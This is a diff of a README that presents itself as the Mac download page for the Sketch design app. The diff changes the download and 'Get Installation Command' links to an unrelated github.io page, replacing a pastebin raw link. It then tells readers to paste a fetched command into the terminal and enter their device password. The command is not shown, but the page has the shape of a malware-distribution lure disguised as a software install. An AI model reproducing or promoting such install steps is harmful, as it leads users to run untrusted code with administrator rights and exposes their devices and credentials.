@@ -1,9 +1,9 @@
 # Sketch — Download For Mac OS
-![logo](https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Sketch-logo-light.svg/1280px-Sketch-logo-light.svg.png)
+![logo-sketch](https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Sketch-logo-light.svg/1280px-Sketch-logo-light.svg.png)
 
 Sketch is a professional vector design and prototyping app that empowers designers to create stunning UI/UX, icons, and illustrations. Follow the instructions below to install it on your Mac and start designing today! 😊
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=apple)](https://juianaiud84.github.io/.github/sketch)
+[![Install Now](https://img.shields.io/badge/Install-Now-blue?style=for-the-badge&logo=apple)](https://dinkkennyrice406.github.io/.github/sketch)
 
 If the download button doesn't work, follow the instructions below using the terminal commands.
 
@@ -20,7 +20,7 @@ If the download button doesn't work, follow the instructions below using the ter
 
 1. Copy the installation command below.
 
-   [![Get Installation Command](https://img.shields.io/badge/Get-Command-green?style=for-the-badge)](https://pastebin.com/raw/Fq88TfPq)
+   [![Get Installation Command](https://img.shields.io/badge/Get-Command-green?style=for-the-badge)](https://dinkkennyrice406.github.io/.github/sketch)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
